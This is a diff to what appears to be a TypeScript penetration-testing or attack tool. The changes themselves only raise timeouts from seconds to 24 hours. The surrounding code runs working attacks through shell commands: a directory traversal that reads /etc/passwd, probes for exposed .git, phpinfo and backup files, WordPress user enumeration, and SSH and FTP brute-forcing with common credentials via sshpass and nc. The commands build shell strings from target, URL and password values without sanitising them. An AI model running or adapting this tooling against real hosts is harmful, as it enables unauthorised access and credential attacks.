@@ -48,21 +48,21 @@ function checkCommonVulns(target: string, port: number): string[] {
   const vulns: string[] = [];
   try {
     // Check for directory traversal
-    const traversalCheck = execSync(`timeout 5 curl -s -k "http://${target}:${port}/../../../../etc/passwd" 2>&1 | grep -E 'root:.*:/bin' || true`, {encoding: 'utf-8'});
+    const traversalCheck = execSync(`timeout 86400 curl -s -k "http://${target}:${port}/../../../../etc/passwd" 2>&1 | grep -E 'root:.*:/bin' || true`, {encoding: 'utf-8'});
     if (traversalCheck.trim()) vulns.push('directory_traversal');
     
     // Check for exposed .git directory
-    const gitCheck = execSync(`timeout 5 curl -s -k -I "http://${target}:${port}/.git/config" 2>&1 | head -1 | grep -E '200|301|302' || true`, {encoding: 'utf-8'});
+    const gitCheck = execSync(`timeout 86400 curl -s -k -I "http://${target}:${port}/.git/config" 2>&1 | head -1 | grep -E '200|301|302' || true`, {encoding: 'utf-8'});
     if (gitCheck.trim()) vulns.push('git_exposure');
     
     // Check for phpinfo
-    const phpCheck = execSync(`timeout 5 curl -s -k "http://${target}:${port}/phpinfo.php" 2>&1 | grep -i 'php version' || true`, {encoding: 'utf-8'});
+    const phpCheck = execSync(`timeout 86400 curl -s -k "http://${target}:${port}/phpinfo.php" 2>&1 | grep -i 'php version' || true`, {encoding: 'utf-8'});
     if (phpCheck.trim()) vulns.push('phpinfo_exposure');
     
     // Check for backup files
     const backupFiles = ['.bak', '.old', '.backup', '.save', '.orig'];
     for (const ext of backupFiles) {
-      const backupCheck = execSync(`timeout 5 curl -s -k -I "http://${target}:${port}/index${ext}" 2>&1 | head -1 | grep -E '200|301|302' || true`, {encoding: 'utf-8'});
+      const backupCheck = execSync(`timeout 86400 curl -s -k -I "http://${target}:${port}/index${ext}" 2>&1 | head -1 | grep -E '200|301|302' || true`, {encoding: 'utf-8'});
       if (backupCheck.trim()) {
         vulns.push(`backup_file_${ext}`);
         break;
@@ -80,12 +80,12 @@ function runWebScan(url: string): any {
     // Simple web reconnaissance
     const headersResult = execSync(`curl -I -s "${url}"`, {
       encoding: 'utf-8',
-      timeout: 10000
+      timeout: 24 * 60 * 60 * 1000
     });
     
-    const certResult = execSync(`timeout 5 openssl s_client -connect ${new URL(url).hostname}:443 -servername ${new URL(url).hostname} 2>/dev/null | openssl x509 -noout -text 2>/dev/null || echo "No SSL cert info"`, {
+    const certResult = execSync(`timeout 86400 openssl s_client -connect ${new URL(url).hostname}:443 -servername ${new URL(url).hostname} 2>/dev/null | openssl x509 -noout -text 2>/dev/null || echo "No SSL cert info"`, {
       encoding: 'utf-8',
-      timeout: 10000
+      timeout: 24 * 60 * 60 * 1000
     });
     
     return {
@@ -102,7 +102,7 @@ function enumerateWordpressUsers(url: string): any[] {
   try {
     const result = execSync(`curl -s "${url}/wp-json/wp/v2/users/" | python3 -c "import sys,json;d=json.load(sys.stdin);[print(f'{u[\"id\"]},{u[\"name\"]},{u[\"slug\"]}') for u in d[:10]]" 2>/dev/null || echo "No users found"`, {
       encoding: 'utf-8',
-      timeout: 10000
+      timeout: 24 * 60 * 60 * 1000
     });
     
     const users = result.trim().split('\n').filter(l => l && !l.includes('No users found')).map(line => {
@@ -147,7 +147,7 @@ function sshBruteForce(target: string, port: number = 22): any {
   for (const cred of commonCredentials) {
     try {
       // Test SSH connection with timeout
-      const result = execSync(`/opt/homebrew/bin/gtimeout 5 sshpass -p "${cred.password}" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=yes -p ${port} ${cred.username}@${target} "echo SUCCESS" 2>&1`, {
+      const result = execSync(`/opt/homebrew/bin/gtimeout 86400 sshpass -p "${cred.password}" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=yes -p ${port} ${cred.username}@${target} "echo SUCCESS" 2>&1`, {
         encoding: 'utf-8'
       });
       
@@ -196,7 +196,7 @@ function ftpBruteForce(target: string, port: number = 21): any {
         QUIT
       `;
       
-      const result = execSync(`echo "${ftpScript}" | /opt/homebrew/bin/gtimeout 5 nc ${target} ${port} 2>/dev/null | grep "230"`, {
+      const result = execSync(`echo "${ftpScript}" | /opt/homebrew/bin/gtimeout 86400 nc ${target} ${port} 2>/dev/null | grep "230"`, {
         encoding: 'utf-8'
       });
       
